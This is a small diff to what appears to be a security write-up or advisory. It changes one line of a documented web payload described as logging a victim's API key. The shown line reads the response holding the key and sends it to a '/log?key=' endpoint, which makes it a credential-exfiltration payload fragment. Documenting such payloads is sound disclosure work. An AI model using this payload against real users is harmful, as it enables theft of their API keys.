@@ -43,7 +43,7 @@ The following payload, delivered to the user, can be used to log their API key i
 
       xhr.onreadystatechange = () => {
         if (xhr.readyState == XMLHttpRequest.DONE) {
-          fetch('/log?key=' + xhr.responseText)
+          fetch(`/log?key=${xhr.responseText}`)
         }
       }
 
@@ -54,5 +54,4 @@ The following payload, delivered to the user, can be used to log their API key i
     </script>
   </body>
 </html>
-
 ```
